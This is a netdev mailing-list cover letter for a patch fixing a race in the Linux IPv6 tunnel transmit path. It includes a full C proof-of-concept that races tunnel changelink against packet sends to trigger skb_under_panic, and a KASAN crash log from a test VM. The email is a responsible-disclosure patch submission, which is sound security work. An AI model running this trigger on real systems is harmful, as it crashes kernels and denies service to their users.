Received: from mail-ot1-f47.google.com (mail-ot1-f47.google.com [209.85.210.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5CEA0442387
	for <netdev@vger.kernel.org>; Sat,  5 Sep 2026 10:01:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.47
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788602518; cv=none; b=b7aYGrAUOPSy+sd8mAU3MQ+9BM6NdFYIc2ts7Q9OE7KliTLtvXc7aVVUxAqMiBSsgqvohSQlw4F69y6ZFEZNpPq+/oNsc0F4lLQUppzXzdVilKqNppzVTgH6mNMZgPO8gZthTDp/SKLjIDKX3aOx0BhrLBOo4GZ/bJ1SHGUi64c=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788602518; c=relaxed/simple;
	bh=dD0YHacxasK0uFIOIGhxuT+ZxCBKI/U0BixzDnCNsJk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=iBidW5oTt58pkNauQPydDtZvOwqnFrBYCM2TiRy8FwOxrQhR2sHyYzEcP6aYsXYuKAydO/P94WLaeeNTDypIN510xNvm8ImY4paupvLiUsqQDYXinkUpJHs2Z8wg8UzHE5wDIJ9MeCqln/3y+0a0aXvvdSsI6yIAAkmDS9ksRRY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=kl+N2yiQ; arc=none smtp.client-ip=209.85.210.47
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="kl+N2yiQ"
Received: by mail-ot1-f47.google.com with SMTP id 46e09a7af769-7e6b5737bb2so2482633a34.1
        for <netdev@vger.kernel.org>; Sat, 05 Sep 2026 03:01:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788602512; x=1789207312; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=NsXcGPZ1HiGfQYCsroKvY9AtgONCYEU/Tr4COta6LMA=;
        b=kl+N2yiQYj3IfnaTOVQ4UB0P7qRKNyGJwfyYvpMtU0KW1fdB1bk+j6v+9WMytDhX/3
         /3HKaB/2cZ1O2sUNXNDAj+hFwssOmSYG4Ta2R6vj4Ad3uFyx5BKl83d9NcKZOSA9S0tg
         GZ24izQSpqlBXavm69/c0CpWX5iik3GsdnJENK22Fy6KjKbosv5LZG6WKIv+A7vwXBZy
         WuXJvQ/VL/6LtxukzArN99RdxMeuyzVlw7SqbB2jMzCKHQucGZO2GA0VJXaBCaDmcAEg
         o6Vtznndk4NWNvjdwP1awBps3FbzXBcEeE71RZ+aujaWWptSBmdahCDhGjYh3zJABW9L
         INYA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788602512; x=1789207312;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=NsXcGPZ1HiGfQYCsroKvY9AtgONCYEU/Tr4COta6LMA=;
        b=pGpocmQ8N8/Y41aiHKkADiucGMYTawrr7ONOIZ54zf3bmuw1h+qfRsS/smU1hXfBuA
         cHIu14JF3jUhip93PCwckUEeKsVHbRrTRRtoUgX61dEY9M2kdNH4BkoCRy1UxKiA0cC1
         p6N38yy84bcsr9renE5ROfx/HAxwGAdzzUtdzjdpmWYfCvrrNZvBFKcSNzbrsRFfIO6Y
         /Pd+r9VASGB+gBwqVqja7xmxb+Fp7AAgi/lerT86iGsfujBSJevjvzfxRKZrLet5ArzC
         snfnJUvRCfSqo0qQlC0oguntdVPYQn7J+FVN2H4GV4NpANCD1uAH4S6Pdf5o4/tUTpxG
         +cXQ==
X-Forwarded-Encrypted: i=1; AKwUvBz8VWvdR2do8xcBpRnJ+jTzI/0RxiGeYywknalHPueESQaDSuP1gQ9QYPDffkTvma7S61jVLQs=@vger.kernel.org
X-Gm-Message-State: AFuF++n/tKKW3EhQEncCNpUrU6V6+JhCtNQN2vHIvZ0H70ERcje+kNKq
	e3pdLv5/4Y2qHpTPwMTGh2CuGaDJZXwythLkzC4boJ02t3wAynXi8huPIGXwoOMrSRLc
X-Gm-Gg: AYBFou00kvF+/UhDcZswqGrL1fvL0kdM6Z0f2SwU/3Y4YrTaqY9Rxql6a3+BdPG2oC1
	0oU9Z+78wy0SN9R2TCS1adpuB0KbHCReakRIDYNUtXc3WhvyQ9a05cGrp3oaEd3uF0pndXYL+7m
	qhVIiPL9De53UjI+AZtB5KoWQJF8WmtTYnbhWnhLna+QGGg6ELYCVy4C/tjGMUH3X59CWfCrIVP
	VziX0jiqYLhQKjrcAo/a8etyrP2hlhpswCg4F7DB0x7rPZ8a9IYgeUzeQzNZZKW0vWfjXtK0qpc
	rON4zP4MYJESkQnn7Y9XBqGJWnDDJiF5CI5tzgsJDC2jtYK0lx0MOMJBuz7wEQyXvGtRmxyClMn
	Lj9K5K/YqXhSPP5vVlYE0i8e0RHeesAtyeav9jD6fqvyVmXtA/2t6cLQcIW/ZPTkMqUAyTYc0tt
	6hIpZ6RAaoARjhrtY6PZB6CD/YiX5dAH7kDcLGjaU/qYbiRcmvsHlTK2wjvvY0Lz4o7xXGGw==
X-Received: by 2002:a05:6820:2915:b0:6b4:3a06:c251 with SMTP id 006d021491bc7-6b6fd6c6c58mr7233987eaf.29.1788602511761;
        Sat, 05 Sep 2026 03:01:51 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-143243908a9sm11676920c88.9.2026.09.05.03.01.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 05 Sep 2026 03:01:51 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: idosch@nvidia.com,
	netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	iprintercanon@gmail.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	tom@herbertland.com,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net v4 0/1] ip6_tunnel: snapshot encap in xmit
Date: Sat,  5 Sep 2026 18:01:35 +0800
Message-ID: <cover.1788262122.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv6/ip6_tunnel.c. The bug is
reachable when an IPv6 tunnel changelink operation races with packet
transmission in a network namespace.

The patch makes each transmitted packet use one local encapsulation
snapshot. No regressions were found in the focused build, functional,
and race tests described below.

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---

Changes in v4:

v3: https://lore.kernel.org/cover.1787499036.git.petalzu987@gmail.com/

- Address Sashiko's review by introducing a shared
	ip_tunnel_encap_snapshot() helper in ip_tunnels.h and using it in
	ip6_tnl_xmit() instead of a transmit-side data_race() struct copy.
- Keep the v3 transmit-side fix shape otherwise unchanged, including
  no change to the needed_headroom adjustment logic.

Changes in v3:

v2: https://lore.kernel.org/cover.1786088695.git.petalzu987@gmail.com/

- Rebase to latest net/main and rerun baseline/fixed QEMU validation.
- Keep the v2 packet-local encapsulation snapshot fix unchanged.

Changes in v2:

v1: https://lore.kernel.org/cover.1785221754.git.petalzu987@gmail.com/

- Replace TX queue quiescing and synchronize_net() with a packet-local
	encapsulation snapshot in ip6_tnl_xmit().
- Use the same snapshot for encapsulation length, metadata validation,
	headroom accounting, and header construction.
- Avoid noqueue packet drops and changes to pre-existing TX queue state.
- Remove the temporary tunnel object and the redundant hlen update.
- Cover ip6tnl and IPv6 GRE-family users of the shared transmit path.
- Leave separate control-plane transactional and IPv4 tunnel issues for
	follow-up work.
- Update the subject to describe the new xmit-side fix.

---- details below ----

Bug details:

ip6_tnl_changelink() can change encapsulation parameters while the
tunnel device is still accepting transmitters. A racing transmitter can
reserve headroom using the old encapsulation state, then build the
packet after the live encapsulation state has changed. This can
underflow the skb head and trigger skb_under_panic() from skb_push().

The patch takes a local snapshot of t->encap in ip6_tnl_xmit() before
calculating the encapsulation header length. Headroom accounting,
metadata validation, and build_header() all use that same snapshot, so
one skb cannot mix encapsulation state from different changelink
generations.

Reproducer:

    make
    ./poc --check-only
    ./poc --race-only --iters 200 --threads 8 --runtime-ms 20

We run the PoC in a 2 vCPU, 1 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_link.h>
#include <linux/if_tunnel.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef IFLA_INFO_KIND
#define IFLA_INFO_KIND 1
#define IFLA_INFO_DATA 2
#endif

#define NL_BUF_SIZE 4096
#define DEFAULT_ITERS 4000
#define DEFAULT_THREADS 4
#define DEFAULT_RUNTIME_MS 150

struct req {
	struct nlmsghdr nlh;
	struct ifinfomsg ifm;
	char buf[NL_BUF_SIZE];
};

struct thread_arg {
	int ifindex;
	int cpu;
	volatile sig_atomic_t *stop;
	unsigned long packets;
	unsigned long errors;
};

static const char *tnl_name = "poc6tnl0";
static const char *dummy_name = "dummy0";
static const char *local_addr = "fec0::1";
static const char *remote_addr = "fec0::1234";
static const char *inner_local4 = "10.23.0.1";
static const char *inner_remote4 = "10.23.0.2";
static int race_threads = DEFAULT_THREADS;
static int race_iterations = DEFAULT_ITERS;
static int race_runtime_ms = DEFAULT_RUNTIME_MS;
static bool run_check = true;
static bool run_race = true;

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t total = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (total > maxlen) {
		fprintf(stderr, "netlink attribute buffer too small\n");
		exit(1);
	}

	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	n->nlmsg_len = total;
}

static struct rtattr *nest_start(struct nlmsghdr *n, size_t maxlen, int type)
{
	struct rtattr *start;

	start = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	addattr_l(n, maxlen, type, NULL, 0);
	return start;
}

static void nest_end(struct nlmsghdr *n, struct rtattr *start)
{
	start->rta_len = (char *)n + n->nlmsg_len - (char *)start;
}

static int run_cmd(const char *cmd)
{
	int ret = system(cmd);
    int status;

	if (ret == -1)
		die("system");
    status = WIFEXITED(ret) ? WEXITSTATUS(ret) : 128 + WTERMSIG(ret);
    if (status)
	    fprintf(stderr, "command failed (status=%d): %s\n", status, cmd);
    return status;
}

static int get_ifindex(const char *name)
{
	struct ifreq ifr;
	int fd;

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", name);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket(AF_INET)");
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("ioctl(SIOCGIFINDEX)");
	close(fd);

	return ifr.ifr_ifindex;
}

static int nl_open(void)
{
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("socket(AF_NETLINK)");

	return fd;
}

static int nl_talk_fd(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	char resp[NL_BUF_SIZE];
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	struct nlmsghdr *reply;
	struct nlmsgerr *err;
	ssize_t len;

	if (sendmsg(fd, &msg, 0) < 0)
		die("sendmsg");

	iov.iov_base = resp;
	iov.iov_len = sizeof(resp);
	len = recvmsg(fd, &msg, 0);
	if (len < 0)
		die("recvmsg");

	reply = (struct nlmsghdr *)resp;
	if (!NLMSG_OK(reply, len) || reply->nlmsg_type != NLMSG_ERROR) {
		fprintf(stderr, "unexpected netlink reply type %u\n", reply->nlmsg_type);
		return -1;
	}

	err = NLMSG_DATA(reply);
	return err->error;
}

static void build_invalid_setlink_req(struct req *req, int ifindex, uint16_t dport)
{
	struct rtattr *linkinfo;
	struct rtattr *infodata;
	const char kind[] = "ip6tnl";
	uint16_t encap_type = TUNNEL_ENCAP_GUE;
	uint16_t encap_flags = TUNNEL_ENCAP_FLAG_REMCSUM;
	uint16_t encap_dport = htons(dport);

	memset(req, 0, sizeof(*req));
	req->nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req->ifm));
	req->nlh.nlmsg_type = RTM_NEWLINK;
	req->nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req->ifm.ifi_family = AF_UNSPEC;
	req->ifm.ifi_index = ifindex;

	linkinfo = nest_start(&req->nlh, sizeof(*req), IFLA_LINKINFO);
	addattr_l(&req->nlh, sizeof(*req), IFLA_INFO_KIND, kind, sizeof(kind));
	infodata = nest_start(&req->nlh, sizeof(*req), IFLA_INFO_DATA);
	addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_ENCAP_TYPE,
		  &encap_type, sizeof(encap_type));
	addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_ENCAP_FLAGS,
		  &encap_flags, sizeof(encap_flags));
	addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_ENCAP_DPORT,
		  &encap_dport, sizeof(encap_dport));
	addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_COLLECT_METADATA, NULL, 0);
	nest_end(&req->nlh, infodata);
	nest_end(&req->nlh, linkinfo);
}

static int send_invalid_setlink(int ifindex, uint16_t dport)
{
	struct req req;
	int fd;
	int err;

	build_invalid_setlink_req(&req, ifindex, dport);
	fd = nl_open();
	err = nl_talk_fd(fd, &req.nlh);
	close(fd);

	return err;
}

static int setup_outer(void)
{
	char cmd[1024];

	snprintf(cmd, sizeof(cmd),
		 "ip link add %s type dummy 2>/dev/null || true; "
		 "ip link set %s up; "
		 "ip -6 addr replace %s/64 dev %s",
		 dummy_name, dummy_name, local_addr, dummy_name);
	return run_cmd(cmd);
}

static int create_ip6tnl_link(void)
{
	struct req req;
	struct rtattr *linkinfo;
	struct rtattr *infodata;
	struct in6_addr local;
	struct in6_addr remote;
	const char kind[] = "ip6tnl";
	uint8_t proto = IPPROTO_IPIP;
	int link = get_ifindex(dummy_name);
	int fd;
	int err;

	if (inet_pton(AF_INET6, local_addr, &local) != 1 ||
		inet_pton(AF_INET6, remote_addr, &remote) != 1)
			die("inet_pton(AF_INET6)");

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifm));
	req.nlh.nlmsg_type = RTM_NEWLINK;
	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
						NLM_F_CREATE | NLM_F_EXCL;
	req.ifm.ifi_family = AF_UNSPEC;
	addattr_l(&req.nlh, sizeof(req), IFLA_IFNAME, tnl_name,
			  strlen(tnl_name) + 1);

	linkinfo = nest_start(&req.nlh, sizeof(req), IFLA_LINKINFO);
	addattr_l(&req.nlh, sizeof(req), IFLA_INFO_KIND, kind, sizeof(kind));
	infodata = nest_start(&req.nlh, sizeof(req), IFLA_INFO_DATA);
	addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_LINK, &link, sizeof(link));
	addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_LOCAL, &local, sizeof(local));
	addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_REMOTE, &remote,
			  sizeof(remote));
	addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_PROTO, &proto, sizeof(proto));
	nest_end(&req.nlh, infodata);
	nest_end(&req.nlh, linkinfo);

	fd = nl_open();
	err = nl_talk_fd(fd, &req.nlh);
	close(fd);
	return err;
}

static int cleanup_tunnel(void)
{
	char cmd[256];

	snprintf(cmd, sizeof(cmd), "ip link del %s 2>/dev/null || true", tnl_name);
	return run_cmd(cmd);
}

static int create_tunnel(void)
{
    char cmd[512];
    int err;

    err = create_ip6tnl_link();
    if (err) {
	    fprintf(stderr, "RTM_NEWLINK ip6tnl failed: %d (%s)\n", err,
		    strerror(-err));
	    return 1;
    }

    snprintf(cmd, sizeof(cmd),
	     "ip addr replace %s peer %s dev %s && ip link set %s up",
		 inner_local4, inner_remote4, tnl_name, tnl_name);
	return run_cmd(cmd);
}

static bool tunnel_mutated(void)
{
	char cmd[512];
	FILE *fp;
	char buf[4096];
	bool mutated = false;

	snprintf(cmd, sizeof(cmd), "ip -d link show dev %s 2>/dev/null", tnl_name);
	fp = popen(cmd, "r");
	if (!fp)
		die("popen(ip link show)");

	while (fgets(buf, sizeof(buf), fp)) {
		if (strstr(buf, "encap gue") && strstr(buf, "encap-remcsum"))
			mutated = true;
	}

	pclose(fp);
	return mutated;
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	if (cpu < 0)
		return;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	(void)pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}

static void *sender_thread(void *arg)
{
	struct thread_arg *targ = arg;
	struct sockaddr_in sin = {
		.sin_family = AF_INET,
		.sin_port = htons(9),
	};
	uint8_t pkt[128];
	int fd;

	pin_to_cpu(targ->cpu);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket(AF_INET)");

	if (inet_pton(AF_INET, inner_remote4, &sin.sin_addr) != 1)
		die("inet_pton(AF_INET)");
	memset(pkt, 0x41, sizeof(pkt));

	while (!*targ->stop) {
		if (sendto(fd, pkt, sizeof(pkt), 0,
			   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			targ->errors++;
			if (errno == ENETDOWN || errno == ENODEV ||
			    errno == ENETUNREACH)
				break;
		} else {
			targ->packets++;
		}
	}

	close(fd);
	return NULL;
}

static int run_check_mode(void)
{
	int ifindex;
	int err;
	bool mutated;

	if (setup_outer())
		return 1;
	cleanup_tunnel();
	if (create_tunnel())
		return 1;

	ifindex = get_ifindex(tnl_name);
	err = send_invalid_setlink(ifindex, 5555);
	mutated = tunnel_mutated();

	printf("[check] netlink_error=%d (%s)\n", err,
	       err ? strerror(-err) : "success");
	printf("[check] mutated=%s\n", mutated ? "yes" : "no");

	return (err == -EINVAL && mutated) ? 0 : 1;
}

static int run_race_mode(void)
{
	int iter;

	for (iter = 0; iter < race_iterations; iter++) {
		pthread_t tids[64];
		struct thread_arg args[64];
		volatile sig_atomic_t stop = 0;
		struct timespec ts;
		int ifindex;
		int i;
		int err;
		unsigned long sent = 0;
		unsigned long failed = 0;

		if (race_threads > (int)(sizeof(tids) / sizeof(tids[0]))) {
			fprintf(stderr, "too many threads requested\n");
			return 1;
		}

		cleanup_tunnel();
		if (create_tunnel())
			return 1;
		ifindex = get_ifindex(tnl_name);

		for (i = 0; i < race_threads; i++) {
			args[i].ifindex = ifindex;
			args[i].cpu = i % 4;
			args[i].stop = &stop;
			args[i].packets = 0;
			args[i].errors = 0;
			if (pthread_create(&tids[i], NULL, sender_thread, &args[i])) {
				perror("pthread_create");
				stop = 1;
				for (i--; i >= 0; i--)
					pthread_join(tids[i], NULL);
				return 1;
			}
		}

		ts.tv_sec = 0;
		ts.tv_nsec = 20 * 1000 * 1000;
		nanosleep(&ts, NULL);

		err = send_invalid_setlink(ifindex, (uint16_t)(6000 + (iter % 512)));

		ts.tv_sec = race_runtime_ms / 1000;
		ts.tv_nsec = (race_runtime_ms % 1000) * 1000 * 1000L;
		nanosleep(&ts, NULL);
		stop = 1;

		for (i = 0; i < race_threads; i++) {
			pthread_join(tids[i], NULL);
			sent += args[i].packets;
			failed += args[i].errors;
		}

		if ((iter % 100) == 0 || err != -EINVAL) {
			printf("[race] iter=%d send_err=%d mutated=%s packets=%lu errors=%lu\n",
			       iter, err, tunnel_mutated() ? "yes" : "no", sent, failed);
			fflush(stdout);
		}
	}

	return 0;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [--check-only] [--race-only] [--iters N] [--threads N] [--runtime-ms N]\n",
		prog);
	exit(1);
}

static void parse_args(int argc, char **argv)
{
	int i;

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--check-only")) {
			run_check = true;
			run_race = false;
		} else if (!strcmp(argv[i], "--race-only")) {
			run_check = false;
			run_race = true;
		} else if (!strcmp(argv[i], "--iters") && i + 1 < argc) {
			race_iterations = atoi(argv[++i]);
		} else if (!strcmp(argv[i], "--threads") && i + 1 < argc) {
			race_threads = atoi(argv[++i]);
		} else if (!strcmp(argv[i], "--runtime-ms") && i + 1 < argc) {
			race_runtime_ms = atoi(argv[++i]);
		} else {
			usage(argv[0]);
		}
	}

	if (race_threads <= 0 || race_threads > 64 ||
	    race_iterations <= 0 || race_runtime_ms <= 0)
		usage(argv[0]);
}

int main(int argc, char **argv)
{
	int ret = 0;

	parse_args(argc, argv);

	if (run_check)
		ret |= run_check_mode();

	if (run_race)
		ret |= run_race_mode();

	return ret;
}
------END poc.c---------

----BEGIN crash log----

[baseline] starting PoC check
[    2.565456] ip (72) used greatest stack depth: 27344 bytes left
[    2.566217] ip (69) used greatest stack depth: 27200 bytes left
[    2.570919] ip (78) used greatest stack depth: 26920 bytes left
[check] netlink_error=-22 (Invalid argument)
[check] mutated=no
[    2.577014] poc (68) used greatest stack depth: 26248 bytes left
[baseline] check exit=1
[baseline] starting PoC race
[    2.589639] ip (82) used greatest stack depth: 24760 bytes left
[race] iter=0 send_err=-22 mutated=no packets=4079 errors=0
[    2.848104] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    4.844972] skbuff: skb_under_panic: text:ffffffffb759b61c len:224 put:40 head:ffff8880050e3a80 data:ffff8880050e3a7c tail:0xdc end:0x180 dev:poc6tnl0
[    4.847654] ------------[ cut here ]------------
[    4.848645] kernel BUG at net/core/skbuff.c:214!
[    4.849571] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[    4.850653] CPU: 1 UID: 0 PID: 561 Comm: poc Not tainted 7.2.0-rc4-00359-g78f75d632f74 #1 PREEMPT(lazy) 
[    4.852421] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[    4.853990] RIP: 0010:skb_panic+0xbe/0xc0
[    4.854631] Code: ff 8b 4b 70 48 c7 c7 60 0e f6 b7 41 56 4d 89 f9 41 55 41 54 55 44 8b 44 24 34 48 8b 54 24 28 48 8b 74 24 20 e8 33 ab d5 fe 90 <0f> 0b 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa
[    4.856913] RSP: 0018:ffffc900012c71c0 EFLAGS: 00010246
[    4.857544] RAX: 000000000000008a RBX: ffff888003313000 RCX: ffffffffb5ed8b55
[    4.858392] RDX: 0000000000000000 RSI: 0000000000000004 RDI: 0000000000000001
[    4.859248] RBP: ffff8880050e3a7c R08: 0000000000000000 R09: fffffbfff711a524
[    4.860119] R10: 0000000000000003 R11: 203a666675626b73 R12: 00000000000000dc
[    4.860997] R13: 0000000000000180 R14: ffff888002c18120 R15: ffff8880050e3a80
[    4.861859] FS:  00007f3b9a1d0640(0000) GS:ffff88807c2d5000(0000) knlGS:0000000000000000
[    4.862846] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.863601] CR2: 00000000006167e0 CR3: 000000000414e001 CR4: 0000000000370ef0
[    4.864477] Call Trace:
[    4.864808]  <TASK>
[    4.865088]  ? ip6_tnl_xmit+0xa2c/0x12d0
[    4.865591]  ? ip6_tnl_xmit+0xa2c/0x12d0
[    4.866076]  skb_push+0x7b/0x80
[    4.866493]  ip6_tnl_xmit+0xa2c/0x12d0
[    4.866984]  ? __pfx_ip6_tnl_xmit+0x10/0x10
[    4.867497]  ? ip_make_skb+0x1e1/0x220
[    4.867974]  ? udp_sendmsg+0xadc/0xf60
[    4.868460]  ? __sys_sendto+0x28d/0x2b0
[    4.869036]  ? __x64_sys_sendto+0x71/0x90
[    4.869549]  ? do_syscall_64+0x102/0x5a0
[    4.870054]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    4.870704]  ip6_tnl_start_xmit+0x5a1/0x900
[    4.871238]  ? __pfx_ip6_tnl_start_xmit+0x10/0x10
[    4.871841]  ? netif_skb_features+0x48a/0x7d0
[    4.872437]  ? kasan_save_track+0x14/0x30
[    4.872949]  dev_hard_start_xmit+0x84/0x300
[    4.873464]  __dev_queue_xmit+0x891/0x1a50
[    4.873967]  ? __pfx___alloc_skb+0x10/0x10
[    4.874472]  ? selinux_ip_postroute_compat+0x271/0x290
[    4.875110]  ? __pfx___dev_queue_xmit+0x10/0x10
[    4.875679]  ? __pfx_selinux_ip_postroute_compat+0x10/0x10
[    4.876366]  ? skb_complete_wifi_ack+0x1e1/0x1f0
[    4.876963]  ? __pfx__copy_from_iter+0x10/0x10
[    4.877513]  ? pick_eevdf+0xd9/0x330
[    4.877976]  ? __pfx_selinux_ip_postroute+0x10/0x10
[    4.878584]  ? selinux_ip_postroute+0x31d/0x5f0
[    4.879141]  ? neigh_connected_output+0x169/0x1d0
[    4.879716]  ip_finish_output2+0x2e6/0x9b0
[    4.880271]  ? __ip_append_data+0x15bf/0x1b50
[    4.880824]  ? __pfx_ip_finish_output2+0x10/0x10
[    4.881392]  __ip_finish_output.part.0+0x256/0x3f0
[    4.881978]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    4.882659]  ? __pfx_selinux_ip_postroute+0x10/0x10
[    4.883254]  ? nf_hook_slow+0x77/0x110
[    4.883741]  ip_output+0x19e/0x280
[    4.884192]  ? __pfx_ip_output+0x10/0x10
[    4.884859]  ? __pfx_ip_finish_output+0x10/0x10
[    4.885416]  ? __pfx_ip_make_skb+0x10/0x10
[    4.885914]  ip_send_skb+0xbf/0xd0
[    4.886361]  udp_send_skb+0x31b/0x4c0
[    4.886848]  udp_sendmsg+0xb16/0xf60
[    4.887295]  ? __pfx_udp_sendmsg+0x10/0x10
[    4.887794]  ? vruntime_eligible+0xdd/0x100
[    4.888349]  ? selinux_socket_sendmsg+0x5c/0x100
[    4.888941]  ? inet_send_prepare+0x18/0x110
[    4.889455]  __sys_sendto+0x28d/0x2b0
[    4.889910]  ? __pfx___sys_sendto+0x10/0x10
[    4.890430]  ? finish_task_switch.isra.0+0x16e/0x510
[    4.891033]  ? xfd_validate_state+0x28/0xb0
[    4.891543]  __x64_sys_sendto+0x71/0x90
[    4.892029]  do_syscall_64+0x102/0x5a0
[    4.892543]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    4.893179] RIP: 0033:0x4528a6
[    4.893569] Code: 85 02 00 44 8b 4c 24 2c 4c 8b 44 24 20 41 89 c4 44 8b 54 24 28 48 8b 54 24 18 b8 2c 00 00 00 48 8b 74 24 10 8b 7c 24 08 0f 05 <48> 3d 00 f0 ff ff 77 3a 44 89 e7 48 89 44 24 08 e8 85 85 02 00 48
[    4.895726] RSP: 002b:00007f3b9a1d0050 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
[    4.896680] RAX: ffffffffffffffda RBX: 00007fff3ca0b700 RCX: 00000000004528a6
[    4.897536] RDX: 0000000000000080 RSI: 00007f3b9a1d0120 RDI: 000000000000000a
[    4.898543] RBP: 000000000000000a R08: 00007f3b9a1d0090 R09: 0000000000000010
[    4.899401] R10: 0000000000000000 R11: 0000000000000293 R12: 0000000000000000
[    4.900372] R13: 00007f3b9a1d0090 R14: 0000000000417740 R15: 00007f3b999d0000
[    4.901214]  </TASK>
[    4.901528] Modules linked in:
[    4.901956] ---[ end trace 0000000000000000 ]---
[    4.902553] RIP: 0010:skb_panic+0xbe/0xc0
[    4.903065] Code: ff 8b 4b 70 48 c7 c7 60 0e f6 b7 41 56 4d 89 f9 41 55 41 54 55 44 8b 44 24 34 48 8b 54 24 28 48 8b 74 24 20 e8 33 ab d5 fe 90 <0f> 0b 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa
[    4.905312] RSP: 0018:ffffc900012c71c0 EFLAGS: 00010246
